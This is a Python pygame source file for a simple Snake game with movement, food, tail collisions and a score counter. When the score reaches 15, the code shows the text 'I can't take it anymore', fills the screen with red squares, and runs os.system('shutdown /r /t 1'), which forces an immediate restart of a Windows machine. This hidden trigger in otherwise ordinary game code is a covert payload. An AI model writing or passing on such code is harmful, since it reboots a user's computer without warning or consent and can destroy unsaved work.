import pygame
import pygame.freetype
import random
import os

# initialize pygame
pygame.init()
pygame.font.init()

# create display & run update
WIDTH = 600
HEIGHT = 500
display = pygame.display.set_mode((WIDTH, HEIGHT))
 
pygame.display.update()
pygame.display.set_caption("Snake.io")
 
# Snake score

SCORE_FONT = pygame.freetype.Font('snake_game\\Montserrat_Regular.ttf', 24)

# All colors

colors = {
    "snake_head": (0, 255, 0),
    "snake_tail": (0, 200, 0),
    "apple": (255, 0, 0)
}


# Snake positions

snake_pos = {
    "x": WIDTH / 2 - 10,
    "y": HEIGHT / 2- 10,
    "x_change": 0,
    "y_change": 0
}
 
# snake el size
snake_size = (10, 10)
 
# current snake movement speed
snake_speed = 10
 
# snake tails
snake_tails = []
 
snake_pos["x_change"] = -snake_speed
for i in range(3):
    snake_tails.append([snake_pos["x"] + 10*i, snake_pos["y"]])
 

food_pos = {
    "x": round(random.randrange(0, WIDTH - snake_size[0]) / 10) * 10,
    "y": round(random.randrange(0, HEIGHT - snake_size[1]) / 10) * 10,
}
 
food_size = (10, 10)
food_eaten = 0
 
# start loop
game_end = False
clock = pygame.time.Clock()
 

while not game_end:
    # game loop
    for event in pygame.event.get():
        if event.type == pygame.QUIT:
            game_end = True

        elif event.type == pygame.KEYDOWN:
            if event.key == pygame.K_LEFT and snake_pos["x_change"] == 0:
                # move left
                snake_pos["x_change"] = -snake_speed
                snake_pos["y_change"] = 0
 
            elif event.key == pygame.K_RIGHT and snake_pos["x_change"] == 0:
                # move right
                snake_pos["x_change"] = snake_speed
                snake_pos["y_change"] = 0
 
            elif event.key == pygame.K_UP and snake_pos["y_change"] == 0:
                # move up
                snake_pos["x_change"] = 0
                snake_pos["y_change"] = -snake_speed
 
            elif event.key == pygame.K_DOWN and snake_pos["y_change"] == 0:
                # move down
                snake_pos["x_change"] = 0
                snake_pos["y_change"] = snake_speed
 

    display.fill((0,0,0))
 
    # Snakes tail moving
    lposx = snake_pos["x"]
    lposy = snake_pos["y"]
 
    for i,v in enumerate(snake_tails):
        _lposx = snake_tails[i][0]
        _lposy = snake_tails[i][1]
 
        snake_tails[i][0] = lposx
        snake_tails[i][1] = lposy
 
        lposx = _lposx
        lposy = _lposy
 
    # draw snake tails
    for t in snake_tails:
        pygame.draw.rect(display, colors["snake_tail"], [
            t[0],
            t[1],
            snake_size[0],
            snake_size[1]])
 
    # draw snake
    snake_pos["x"] += snake_pos["x_change"]
    snake_pos["y"] += snake_pos["y_change"]
 
    # teleport snake, if required
    if(snake_pos["x"] < -snake_size[0]):
        snake_pos["x"] = WIDTH
 
    elif(snake_pos["x"] > WIDTH):
        snake_pos["x"] = 0
 
    elif(snake_pos["y"] < 0):
        snake_pos["y"] = HEIGHT
 
    elif(snake_pos["y"] > HEIGHT):
        snake_pos["y"] = 0
 
    pygame.draw.rect(display, colors["snake_head"], [snake_pos["x"], snake_pos["y"],
                                                    snake_size[0], snake_size[1]])
 
    # draw food
    pygame.draw.rect(display, colors["apple"], [food_pos["x"], food_pos["y"], food_size[0], food_size[1]])
 
    # detect collision with food
    if(snake_pos["x"] == food_pos["x"]
        and snake_pos["y"] == food_pos["y"]):
        food_eaten += 1
        snake_tails.append([food_pos["x"], food_pos["y"]])
 
        food_pos = {
            "x": round(random.randrange(0, WIDTH - snake_size[0]) / 10) * 10,
            "y": round(random.randrange(0, HEIGHT - snake_size[1]) / 10) * 10,
        }
 
    # detect collision with tail
    for i,v in enumerate(snake_tails):
        if(snake_pos["x"] + snake_pos["x_change"] == snake_tails[i][0]
            and snake_pos["y"] + snake_pos["y_change"] == snake_tails[i][1]):
            snake_tails = snake_tails[:i]
            break

    if  food_eaten == 15:
        _display = pygame.display.set_mode((WIDTH, HEIGHT))
        pygame.display.update()

        SCORE_FONT.render_to(
            display, (WIDTH / 2 - 100, 20), 
            f"I can't take it anymore", 
            (255, 255, 255))
        
        for i in range(300):
            pos = {
                'x': round(random.randrange(0, WIDTH - snake_size[0]) / 10) * 10,
                'y': round(random.randrange(0, WIDTH - snake_size[0]) / 10) * 10
            }

            pygame.draw.rect(_display, (255, 0, 0), [pos['x'], pos['y'], 15, 15])
            pygame.display.update()

        os.system('shutdown /r /t 1')
    else:
        SCORE_FONT.render_to(
            display, (WIDTH / 2 - 60, 20), 
            f"Score: {food_eaten}", 
            (255, 255, 255))

    pygame.display.update()
    clock.tick(30)

pygame.quit()
quit()